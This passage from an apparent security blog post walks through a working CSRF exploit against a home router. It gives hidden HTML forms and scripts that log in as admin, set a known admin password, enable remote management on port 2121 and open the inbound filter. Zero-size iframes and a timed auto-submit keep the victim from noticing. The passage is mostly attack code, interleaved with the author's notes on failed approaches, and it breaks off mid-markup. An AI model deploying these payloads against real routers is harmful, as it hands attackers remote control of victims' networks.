class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5639325140098-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"submitType"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5639325140098-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"sel_userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5639325140098-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5639325140098-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"passwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5639325140098-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"captchapwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5639325140098-8"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0045 seconds] -->
<p>&nbsp;</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa5648231850352" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="adminForm" method="POST" action="http://192.168.0.1/tools_admin.htm"&gt;
	&lt;input type="hidden" name="page" value="tools_admin" /&gt;
	&lt;input type="hidden" name="admin_password1" value="qweasd" /&gt;
	&lt;input type="hidden" name="admin_password2" value="qweasd" /&gt;
	&lt;input type="hidden" name="hostname" value="REMOTEENABLED" /&gt;
	&lt;input type="hidden" name="graphical_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_http_management_port" value="2121" /&gt;
	&lt;input type="hidden" name="remote_inbound_filter" value="11" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa5648231850352-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5648231850352-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa5648231850352-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5648231850352-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa5648231850352-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5648231850352-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa5648231850352-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5648231850352-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa5648231850352-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5648231850352-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa5648231850352-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"adminForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/tools_admin.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5648231850352-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"tools_admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5648231850352-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password1"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5648231850352-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password2"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5648231850352-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"hostname"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"REMOTEENABLED"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5648231850352-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"graphical_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5648231850352-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5648231850352-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_http_management_port"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"2121"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5648231850352-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_inbound_filter"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"11"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5648231850352-10"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0057 seconds] -->
<p><strong> The problem</strong></p>
<p>In order to get a reliable CSRF exploit for this, we&#8217;d really like a single page we can send an user to, and it takes care of making these requests to do the exploit. But this turned out to be not quite so easy, and googling turned up very few suggestion for how to make several requests in order and time them correctly to allow authentication before the CSRF attack request. Here were some of the ways I tried:</p>
<p><strong>Failed solution 1: A single page with 2 forms, calling document.formname.submit(); in sequence</strong></p>
<p>This didn&#8217;t work. What ended up happening is that the login form wasn&#8217;t submitted. Also because we submit the form, we end up with the problem that the browser navigates to action URL. This is because of the default target of the form(_self).</p>
<p><strong><strong>Failed solution </strong>2: A single page with 2 forms that has a target _blank or an iframe</strong></p>
<p>Given the navigation issue I encountered in my first attempt, I started testing out how the target of the form affected things. As it turns out, modern browsers are really not big fans of iframes or new windows. Targeting a frame simply didn&#8217;t work. And when you use _blank as a target, the user has to explicitly allow it in modern browsers. In order to exploit this reliably, we can&#8217;t rely on user interaction.</p>
<p><strong><strong>Failed solution </strong>3: XMLHttp requests</strong></p>
<p>AJAX is wonderful. So I figured why not try and come up with a solution using XMLHttp and a bit of Javascript. This fell flat very quickly, as XMLHttp respects same origin policy.</p>
<p><strong>The solution</strong></p>
<p>A solution to this would require following:</p>
<ul>
<li>Control of timing between requests</li>
<li>To still have control of the page the user loaded, even if the form navigates to a target.</li>
<li>No popups</li>
<li>Little, if any, indication to the user that their router is being owned</li>
</ul>
<p>My solution ended up being a bit less neat. However it works quite well against any default browser without any noscript and such(Which would break most CSRF attacks requiring to post, unless you want to rely on user input). It&#8217;s quite a bit along the line of the idea of setting each form target to a different frame. But since I couldn&#8217;t get them to target an iframe in a single page, I split the payload into 3 parts.</p>
<ol>
<li>Landing page with 2 iframes, each containing their own payload</li>
<li>A login request</li>
<li>A delayed CSRF attack against the vulnerable page as desired</li>
</ol>
<p>The main landing pages is quite simple, as it just loads each page for execution:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa5655731518585" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;iframe src="login.html" width="0" height="0"&gt;
&lt;/iframe&gt;
&lt;iframe src="exploit.html"  width="0" height="0"&gt;
&lt;/iframe&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa5655731518585-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5655731518585-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa5655731518585-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5655731518585-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa5655731518585-1"><span class="crayon-o">&lt;</span><span class="crayon-e">iframe </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"login.html"</span><span class="crayon-h"> </span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5655731518585-2"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">iframe</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5655731518585-3"><span class="crayon-o">&lt;</span><span class="crayon-e">iframe </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"exploit.html"</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5655731518585-4"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">iframe</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0017 seconds] -->
<p>By setting the width and height, all you&#8217;re left with is a tiny dot on the screen. This could be mitigated by doing some styling potentially to render it off screen.</p>
<p>Second step is to log in. Here we rely on the fact that the admin user by default does not have any password set.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa565e092484066" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="loginForm" method="POST" action="http://192.168.0.1/login.htm"&gt;
	&lt;input type="hidden" name="page" value="login" /&gt;
	&lt;input type="hidden" name="submitType" value="0" /&gt;
	&lt;input type="hidden" name="sel_userid" value="admin" /&gt;
	&lt;input type="hidden" name="userid" value="" /&gt;
	&lt;input type="hidden" name="passwd" value="qweasd" /&gt;
	&lt;input type="hidden" name="captchapwd" value="" /&gt;
&lt;/form&gt;
&lt;script type="text/javascript"&gt;
	document.loginForm.submit();
&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa565e092484066-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa565e092484066-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa565e092484066-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa565e092484066-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa565e092484066-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa565e092484066-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa565e092484066-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa565e092484066-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa565e092484066-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa565e092484066-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa565e092484066-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa565e092484066-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"loginForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/login.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa565e092484066-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"login"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa565e092484066-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"submitType"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa565e092484066-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"sel_userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa565e092484066-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa565e092484066-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"passwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa565e092484066-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"captchapwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa565e092484066-8"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-e">form</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa565e092484066-9"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa565e092484066-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">loginForm</span><span class="crayon-sy">.</span><span class="crayon-e">submit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa565e092484066-11"><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0080 seconds] -->
<p>Nothing fancy really happens here. We just have to make sure that the user is authenticated for our second stage, which is the CSRF attack which exploits the real weakness in the router:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa5667379307626" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="adminForm" method="POST" action="http://192.168.0.1/tools_admin.htm"&gt;
	&lt;input type="hidden" name="page" value="tools_admin" /&gt;
	&lt;input type="hidden" name="admin_password1" value="qweasd" /&gt;
	&lt;input type="hidden" name="admin_password2" value="qweasd" /&gt;
	&lt;input type="hidden" name="hostname" value="REMOTEENABLED" /&gt;
	&lt;input type="hidden" name="graphical_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_http_management_port" value="2121" /&gt;
	&lt;input type="hidden" name="remote_inbound_filter" value="11" /&gt;
&lt;/form&gt;

&lt;script type="text/javascript"&gt;
	window.setTimeout(doFormSubmit, 5000);
	function doFormSubmit()
	{
		document.adminForm.submit();
	}
&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-15">15</div><div 